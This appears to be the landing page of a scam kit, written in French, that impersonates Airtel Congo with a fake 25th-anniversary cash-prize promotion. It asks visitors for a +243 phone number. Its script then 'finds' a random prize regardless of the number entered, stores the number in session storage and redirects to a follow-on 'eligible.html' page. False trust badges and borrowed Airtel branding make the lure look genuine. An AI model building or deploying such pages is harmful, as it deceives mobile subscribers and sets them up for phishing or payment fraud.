<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AIRTEL CONGO - 25 Ans Ensemble</title>
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Segoe UI', Roboto, Arial, sans-serif;
  }

  body {
    min-height: 100vh;
    background: #0a0a0a;
    overflow-x: hidden;
  }

  .ann-root {
    position: relative;
    min-height: 100vh;
    background: linear-gradient(135deg, #1a0000 0%, #2d0000 40%, #1a0505 100%);
    overflow: hidden;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }

  /* Blobs */
  .ann-blob {
    position: absolute;
    border-radius: 50%;
    filter: blur(80px);
    opacity: 0.5;
    pointer-events: none;
  }
  .ann-blob-1 {
    width: 400px;
    height: 400px;
    background: #e30613;
    top: -100px;
    left: -100px;
    animation: float 8s ease-in-out infinite;
  }
  .ann-blob-2 {
    width: 350px;
    height: 350px;
    background: #ffcc00;
    bottom: -80px;
    right: -80px;
    animation: float 10s ease-in-out infinite reverse;
    opacity: 0.3;
  }
  .ann-blob-3 {
    width: 300px;
    height: 300px;
    background: #e30613;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    animation: float 12s ease-in-out infinite;
    opacity: 0.2;
  }

  @keyframes float {
    0%, 100% { transform: translate(0, 0) scale(1); }
    50% { transform: translate(30px, -30px) scale(1.1); }
  }

  .ann-confetti-layer {
    position: absolute;
    inset: 0;
    pointer-events: none;
    overflow: hidden;
  }

  .ann-inner {
    position: relative;
    z-index: 10;
    width: 100%;
    max-width: 480px;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 24px;
  }

  /* Logo bar */
  .ann-logo-bar {
    display: flex;
    align-items: center;
    gap: 12px;
    background: rgba(255, 255, 255, 0.05);
    padding: 10px 20px;
    border-radius: 50px;
    border: 1px solid rgba(255, 255, 255, 0.1);
    backdrop-filter: blur(10px);
  }

  .ann-logo {
    height: 32px;
    width: auto;
    filter: brightness(0) invert(1);
  }

  .ann-logo-divider {
    width: 1px;
    height: 24px;
    background: rgba(255, 255, 255, 0.2);
  }

  .ann-25-badge {
    color: #ffcc00;
    font-size: 13px;
    font-weight: 700;
    letter-spacing: 0.5px;
    white-space: nowrap;
  }

  /* Hero */
  .ann-hero {
    text-align: center;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 16px;
  }

  .ann-anniversary-ring {
    width: 110px;
    height: 110px;
    border-radius: 50%;
    background: conic-gradient(from 0deg, #e30613, #ffcc00, #e30613, #ffcc00, #e30613);
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    position: relative;
    box-shadow: 0 0 40px rgba(227, 6, 19, 0.6);
    animation: pulse-ring 3s ease-in-out infinite;
  }

  .ann-anniversary-ring::before {
    content: '';
    position: absolute;
    inset: 5px;
    border-radius: 50%;
    background: #1a0000;
  }

  @keyframes pulse-ring {
    0%, 100% { box-shadow: 0 0 40px rgba(227, 6, 19, 0.6); }
    50% { box-shadow: 0 0 60px rgba(255, 204, 0, 0.8); }
  }

  .ann-25-num {
    position: relative;
    z-index: 1;
    font-size: 40px;
    font-weight: 900;
    color: #ffcc00;
    line-height: 1;
  }

  .ann-25-label {
    position: relative;
    z-index: 1;
    font-size: 12px;
    font-weight: 600;
    color: #fff;
    letter-spacing: 2px;
    text-transform: uppercase;
  }

  .ann-hero-title {
    font-size: 28px;
    font-weight: 800;
    color: #fff;
    line-height: 1.3;
    text-align: center;
  }

  .ann-gold {
    background: linear-gradient(90deg, #ffcc00, #ffaa00, #ffcc00);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
  }

  .ann-hero-sub {
    font-size: 14px;
    color: rgba(255, 255, 255, 0.75);
    line-height: 1.6;
    text-align: center;
    max-width: 380px;
  }

  /* Card */
  .ann-card {
    width: 100%;
    background: rgba(255, 255, 255, 0.06);
    border: 1px solid rgba(255, 255, 255, 0.12);
    border-radius: 20px;
    padding: 24px;
    backdrop-filter: blur(20px);
    display: flex;
    flex-direction: column;
    gap: 16px;
    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
  }

  .ann-card-title {
    display: flex;
    align-items: center;
    gap: 8px;
    font-size: 16px;
    font-weight: 700;
    color: #fff;
  }

  .ann-card-title-icon {
    font-size: 20px;
  }

  .ann-input-wrap {
    display: flex;
    align-items: center;
    background: rgba(0, 0, 0, 0.4);
    border: 2px solid rgba(255, 204, 0, 0.3);
    border-radius: 12px;
    padding: 0 16px;
    transition: border-color 0.3s;
  }

  .ann-input-wrap:focus-within {
    border-color: #ffcc00;
    box-shadow: 0 0 20px rgba(255, 204, 0, 0.2);
  }

  .ann-prefix {
    color: #ffcc00;
    font-weight: 700;
    font-size: 16px;
    padding-right: 10px;
    border-right: 1px solid rgba(255, 255, 255, 0.15);
    margin-right: 10px;
  }

  .ann-input {
    flex: 1;
    background: transparent;
    border: none;
    outline: none;
    color: #fff;
    font-size: 16px;
    padding: 16px 0;
    letter-spacing: 1px;
  }

  .ann-input::placeholder {
    color: rgba(255, 255, 255, 0.35);
    font-size: 14px;
    letter-spacing: 0;
  }

  .ann-check-btn {
    width: 100%;
    padding: 16px;
    border: none;
    border-radius: 12px;
    background: linear-gradient(135deg, #e30613, #b00510);
    color: #fff;
    font-size: 16px;
    font-weight: 700;
    cursor: pointer;
    transition: all 0.3s;
    box-shadow: 0 8px 24px rgba(227, 6, 19, 0.4);
    letter-spacing: 0.5px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
  }

  .ann-check-btn:hover:not(:disabled) {
    transform: translateY(-2px);
    box-shadow: 0 12px 32px rgba(227, 6, 19, 0.6);
  }

  .ann-check-btn:disabled {
    opacity: 0.7;
    cursor: not-allowed;
  }

  /* Spinner inside button */
  .btn-spinner {
    width: 18px;
    height: 18px;
    border: 2.5px solid rgba(255, 255, 255, 0.3);
    border-top-color: #fff;
    border-radius: 50%;
    animation: spin 0.7s linear infinite;
    display: none;
  }
  .btn-spinner.show { display: block; }
  @keyframes spin { to { transform: rotate(360deg); } }

  /* Trust row */
  .ann-trust-row {
    display: flex;
    gap: 10px;
    flex-wrap: wrap;
    justify-content: center;
  }

  .ann-trust-pill {
    background: rgba(255, 255, 255, 0.06);
    border: 1px solid rgba(255, 255, 255, 0.1);
    border-radius: 50px;
    padding: 8px 16px;
    font-size: 12px;
    color: rgba(255, 255, 255, 0.8);
    font-weight: 600;
    white-space: nowrap;
  }

  /* Error message */
  .ann-error-msg {
    background: rgba(227, 6, 19, 0.15);
    border: 1px solid rgba(227, 6, 19, 0.4);
    border-radius: 10px;
    padding: 10px 14px;
    font-size: 13px;
    color: #ff6b6b;
    text-align: center;
    display: none;
  }
  .ann-error-msg.show { display: block; }

  /* Confetti */
  .confetti-piece {
    position: absolute;
    width: 10px;
    height: 10px;
    top: -20px;
    opacity: 0;
    animation: confetti-fall linear forwards;
  }

  @keyframes confetti-fall {
    0% { transform: translateY(0) rotate(0deg); opacity: 1; }
    100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
  }
</style>
</head>
<body>
<div id="root">
  <div class="ann-root">
    <div class="ann-blob ann-blob-1"></div>
    <div class="ann-blob ann-blob-2"></div>
    <div class="ann-blob ann-blob-3"></div>
    <div class="ann-confetti-layer" id="confettiLayer"></div>
    <div class="ann-inner">
      <div class="ann-logo-bar">
        <img alt="Airtel" class="ann-logo" src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg">
        <div class="ann-logo-divider"></div>
        <span class="ann-25-badge">25 ans ensemble</span>
      </div>
      <div class="ann-hero">
        <div class="ann-anniversary-ring">
          <div class="ann-25-num">25</div>
          <div class="ann-25-label">Ans</div>
        </div>
        <h1 class="ann-hero-title">Grande Célébration<br><span class="ann-gold">Airtel DRC 🎉</span></h1>
        <p class="ann-hero-sub">Pour nos 25 ans, nous offrons des cash prizes exclusifs à nos abonnés fidèles. Vérifiez votre éligibilité maintenant !</p>
      </div>
      <div class="ann-card">
        <div class="ann-card-title"><span class="ann-card-title-icon">🎁</span> Vérifier mon éligibilité</div>
        <div class="ann-input-wrap">
          <span class="ann-prefix">+243</span>
          <input class="ann-input" id="phoneInput" inputmode="numeric" placeholder="912345678 ou 0912345678" maxlength="10" type="tel" value="">
        </div>
        <div class="ann-error-msg" id="errorMsg"></div>
        <button class="ann-check-btn" id="checkBtn" onclick="checkEligibility()">
          <span class="btn-spinner" id="btnSpinner"></span>
          <span id="btnText">🔍 Vérifier mon numéro</span>
        </button>
      </div>
      <div class="ann-trust-row">
        <div class="ann-trust-pill">🔒 Sécurisé</div>
        <div class="ann-trust-pill">⚡ Résultat instantané</div>
        <div class="ann-trust-pill">👥 25K gagnants</div>
      </div>
    </div>
  </div>
</div>

<script>
  /* ==================== ELEMENTS ==================== */
  const phoneInput = document.getElementById('phoneInput');
  const checkBtn = document.getElementById('checkBtn');
  const btnSpinner = document.getElementById('btnSpinner');
  const btnText = document.getElementById('btnText');
  const errorMsg = document.getElementById('errorMsg');

  /* ==================== PHONE INPUT (digits only) ==================== */
  phoneInput.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/\D/g, '');
    hideError();
  });

  /* ==================== ERROR HELPERS ==================== */
  function showError(message) {
    errorMsg.textContent = message;
    errorMsg.classList.add('show');
  }

  function hideError() {
    errorMsg.classList.remove('show');
  }

  /* ==================== CHECK ELIGIBILITY (LOCAL — NO BACKEND) ==================== */
  async function checkEligibility() {
    const phone = phoneInput.value.trim();

    // Validation
    if (!phone || phone.length < 9) {
      showError('Veuillez entrer un numéro de téléphone valide.');
      return;
    }

    // Show loading
    btnSpinner.classList.add('show');
    btnText.textContent = 'Vérification...';
    checkBtn.disabled = true;
    hideError();

    // Simulate short delay, then generate amount + session locally
    setTimeout(() => {
      const amounts = [1190, 850, 1500, 2200, 950];
      const amount = amounts[Math.floor(Math.random() * amounts.length)];
      const session_token = 'sess_' + Date.now() + '_' +
                            Math.random().toString(36).slice(2, 10);

      // Save session data for next pages
      sessionStorage.setItem('airtel_phone', phone);
      sessionStorage.setItem('airtel_amount', amount);
      sessionStorage.setItem('airtel_session', session_token);

      // Redirect to eligible page
      window.location.href = 'eligible.html';
    }, 800);
  }

  /* ==================== CONFETTI ==================== */
  const confettiLayer = document.getElementById('confettiLayer');
  const confettiColors = ['#e30613', '#ffcc00', '#ffffff', '#00c853', '#ffaa00'];

  function createConfetti() {
    const piece = document.createElement('div');
    piece.classList.add('confetti-piece');
    piece.style.left = Math.random() * 100 + '%';
    piece.style.backgroundColor = confettiColors[Math.floor(Math.random() * confettiColors.length)];
    piece.style.width = (Math.random() * 8 + 6) + 'px';
    piece.style.height = (Math.random() * 8 + 6) + 'px';
    piece.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
    piece.style.animationDuration = (Math.random() * 2 + 2) + 's';
    piece.style.animationDelay = Math.random() * 0.5 + 's';
    confettiLayer.appendChild(piece);
    setTimeout(() => piece.remove(), 5000);
  }

  for (let i = 0; i < 25; i++) setTimeout(createConfetti, i * 80);
  setInterval(createConfetti, 350);
</script>
</body>
</html>
